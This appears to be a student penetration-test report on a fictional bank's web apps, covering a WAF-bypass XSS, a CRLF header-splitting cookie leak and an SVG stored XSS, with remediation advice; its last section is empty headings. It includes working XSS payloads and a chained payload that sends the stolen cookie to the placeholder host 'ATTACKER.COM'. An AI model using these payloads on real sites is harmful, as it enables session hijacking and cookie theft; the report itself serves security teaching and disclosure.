# Report 2

### MEDIUM - XSS through WAF Vulnerability in report.quoccabank.com

**Asset Domain:** report.quoccabank.com
**Severity Classification:** MEDIUM

#### Vulnerability Details
The web application firewall (WAF) contains a race condition vulnerability which can be exploited so that some parts of the HTML are left unsanitised, exposing XSS in the report content. 

#### Proof of Concept / Steps to Reproduce

![report1](images/report1.png)

The robots.txt route indicates that there is a /view page for the website. Through experimentation, it can be discovered that the navigating to /view/{sessionID} allows one to view a submitted report, where the sessionID can be found through the cookie returned by the server upon sending a report. Sending a report with title and content `<b>test</b>` and viewing the rendered report, it can be seen, from the image above, that the report content is potentially vulnerable to reflected XSS, whilst the title seems to be appropriately HTML encoded. It seems that the WAF, which can be found in the report's source code, is able to strongly sanitise malicious tags and attributes, blocking a lot of malicious payloads. However, a vulnerability exists when trying to delete a malicious child element from the HTML content. The WAF iterates over the list of HTML child elements, calling the `sanitize()` function on each child within the loop, where unsafe child elements detected would be deleted from the list of child elements within the function. Due to list indexing, this means that the first element after an unsafe element will be skipped from the loop so they will remain unsantizied, leaving report viewers (such as admin) vulnerable to XSS attacks. As such, HTML can be inserted as the report content where the first child gets removed, but the next child element passes through the WAF and gets executed. For example, the following payload triggers arbitrary client side code execution as a proof of concept, where the script tag gets filtered out, but the following JavaScript is left unsanitised:

```html
<script></script>
<svg/onload=alert(1)>
```

![report2](images/report2.png)

![report3](images/report3.png)

#### Impact

As demonstrated above, the vulnerability with the WAF allows for arbitrary client side code execution. However, this vulnerability alone is not sufficient in allowing an attacker to steal another user's cookies, since the cookies are HTTP-only (please refer to the CRLF injection vulnerability outlined in this document).

#### Remediation

Regarding the WAF vulnerability, the most effective method of mitigating XSS is to disallow HTML user input in the first place, either HTML encoding user input or using a text parser if text formatting or image insertions are needed. Although using a `filter` function to sanitise children of the HTML report content, instead of removing elements whilst iterating over their containing array, would fix the WAF vulnerability, the safest way of sanitising user input would be to use popular trusted frameworks designed for HTML sanitisation, such as DOMPurify. These frameworks would most likely contain fewer vulnerabilities compared to writing a WAF yourself.



### CRITICAL - CRLF vulnerability in report.quoccabank.com

**Asset Domain:** report.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

Report titles are vulnerable to Carriage Return Line Feed (CRLF) injections, where certain HTTP headers can be pushed into the HTTP body and rendered as HTML. This means that JavaScript is able to access HTTP-only cookies which would normally be unable to be accessed through JavaScript.

#### Proof of Concept / Steps to Reproduce

![report4](images/report4.png)

Submitting a report and examining the server response on accessing the report view page, it can be noted above that my report title "Title" can be found in the HTTP response header when viewing the report, under the x-meta header. HTTP response header splitting can be used to "push" the HTTP-only cookie found in the server response header into the HTML body. With the same report content, intercepting sending a report and simply adding two url-encoded carriage return characters (\r\n) `%0D%0A%0D%0A` to the end of the report's title using Burp Suite, it can be seen that some extra HTML text can be found at the top of the page, containing the cookie (below). 

![report5](images/report5.png)

#### Impact

The CRLF injection vulnerability causes cookies sent from the server to not be set properly, effectively rendering the HTTP-only cookie setting useless. When visiting a compromised site (such as through chaining this vulnerability with the XSS vulnerability in report.quoccabank.com), this vulnerability allows HTTP-only cookies to be picked up using JavaScript by using regex to search for them in the HTML body, which can then be forwarded to an attacker. An attacker may then be able to impersonate them and access reports they submitted, since report sessionIDs are stored in cookies. An example payload can be achieved through appending two carriage return characters to the report title, and using the following report content:

```html
<script></script>
<svg/onload=fetch('ATTACKER.COM/?q='+document.documentElement.outerText.match(/flag=(.*?);/)[1])/>
```

#### Remediation

The CRLF injection vulnerability can also be remediated by sanitising report titles (stripping new line characters from title before sent as a HTTP header) or properly encoded in the HTTP response header output. However, if its inclusion in the x-meta HTTP header is unnecessary, then it would be better to simply remove it from the header instead.



### MEDIUM - Profile Picture Stored XSS

**Asset Domain:** profile.quoccabank.com

**Severity Classification:** MEDIUM

#### Vulnerability Details

Cross site scripting can be triggered by accessing the url corresponding to an uploaded svg containing a malicious script. 

#### Proof of Concept / Steps to Reproduce

Upload the following svg file to profile.quoccabank.com:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
 <script>alert(1)</script>
</svg>
```

Accessing the URL of the uploaded image (at /profileimage?{profileID}), the alert script gets executed as a proof of concept, as demonstrated below. The JavaScript will also be executed for any user accessing this link.

![profile1](images/profile1.png)

#### Impact

As demonstrated above with a proof of concept, this vulnerability enables arbitrary client side code execution. This means an attacker may be able to steal user cookies and hijack sessions and other sensitive data. 

#### Remediation

Prohibiting the upload of svg files prevents similar attacks from happening. However, if this is not possible, updating the Content Security Policy (CSP) to a value like `Content-Security-Policy: script-src 'none'` will block script execution for malicious SVGs. Another method is to purify or convert uploaded SVGs to a universal format, such as a jpg or png. Furthermore, from inspecting the request for the image, it can be seen that the server returns the image as an `image/svg+xml`. Changing the MIME type to something like "application/octet-string" forces browsers to download the SVG content rather than rendering it inline, for example, and can prevent similar XSS attacks from occuring.

![profile2](images/profile2.png)



### CRITICAL - sturec

**Asset Domain:** sturec.quoccabank.com

**Severity Classification:** CRITICAL

#### Vulnerability Details

#### Proof of Concept / Steps to Reproduce

#### Impact

#### Remediation
